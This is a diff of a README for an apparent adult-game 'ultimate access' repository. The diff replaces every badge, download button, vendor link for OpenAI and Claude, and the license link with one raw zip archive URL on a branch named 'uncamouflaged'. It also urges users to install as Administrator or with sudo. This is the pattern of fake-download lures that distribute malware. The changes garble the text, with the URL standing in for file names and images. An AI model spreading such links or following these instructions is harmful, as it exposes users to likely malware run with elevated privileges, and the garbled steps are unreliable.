@@ -1,9 +1,9 @@
 # The Lust City Ultimate Access Repository
 
-![Repo Header](https://img.shields.io/badge/Lust%20City-Ultimate%20Access-ff69b4?style=for-the-badge&logo=github)
-[![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)](https://shields.io/)
-[![Top Platform](https://img.shields.io/badge/platform-Windows%7CMac%7CLinux-blueviolet?style=flat-square)](https://shields.io/)
-[![MIT License](https://img.shields.io/badge/license-MIT-yellow?style=flat-square)](#-license)
+![Repo Header](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip%20City-Ultimate%20Access-ff69b4?style=for-the-badge&logo=github)
+[![Build](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
+[![Top Platform](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip%7CMac%7CLinux-blueviolet?style=flat-square)](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
+[![MIT License](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)](#-license)
 
 ---
 
@@ -11,7 +11,7 @@ Welcome to **The Lust City Ultimate Access** repository, your express gateway to
 
 Before you set sail into this digital metropolis, follow the instructions below to ignite your journey:
 
-[![Download](https://i.imgur.com/tV7nZDd.png)](https://wichonemes.github.io)
+[![Download](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
 
 ---
 
@@ -54,7 +54,7 @@ Follow these steps to unlock Lust City’s full spectrum of experiences:
 
 Click to download your tailored installer package:
 
-[![Download](https://i.imgur.com/tV7nZDd.png)](https://wichonemes.github.io)
+[![Download](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
 
 > Tip: For the safest and smoothest ride through installation, run as Administrator (Windows) or using `sudo` (Unix-based OS).
 
@@ -62,7 +62,7 @@ Click to download your tailored installer package:
 
 - Windows: Double-click `.exe` and follow on-screen instructions.
 - macOS: Open `.dmg` and drag Lust City to `Applications`.
-- Linux: Unzip and run `install.sh` (may require permissions: `chmod +x install.sh`).
+- Linux: Unzip and run `https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip` (may require permissions: `chmod +x https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip`).
 
 ### 4. Launch and Personalize
 
@@ -88,7 +88,7 @@ Unlock new dimensions—literally—with Lust City’s built-in support for conv
 - **Claude API**: Add Claude’s capabilities for ethical conversations and next-gen storytelling—respectful, engaging, and endlessly creative.
 
 **How to Connect:**
-1. Obtain your keys from [OpenAI](https://openai.com/) and [Claude](https://claude.ai/).
+1. Obtain your keys from [OpenAI](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip) and [Claude](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip).
 2. Load Lust City and enter API credentials via `Settings` > `AI Integrations`.
 3. Wave hello to a smarter, livelier city every time you play.
 
@@ -118,7 +118,7 @@ We do **not** host any copyrighted material nor condone unauthorized usage of pr
 ## 📜 License
 
 This project is licensed under the 2025 MIT License – open, permissive, and built for creators and innovators.  
-Read the full license here: [MIT License](https://opensource.org/licenses/MIT)
+Read the full license here: [MIT License](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
 
 ---
 
@@ -126,7 +126,7 @@ Read the full license here: [MIT License](https://opensource.org/licenses/MIT)
 
 Ready to re-enter the city, or need to provide a friend access? Click below to revisit the installer:
 
-[![Download](https://i.imgur.com/tV7nZDd.png)](https://wichonemes.github.io)
+[![Download](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)](https://github.com/wichonemes/lust-city-pc-edition-archive/raw/refs/heads/branch/uncamouflaged/city_archive_edition_lust_pc_v3.1.zip)
 
 ---
 
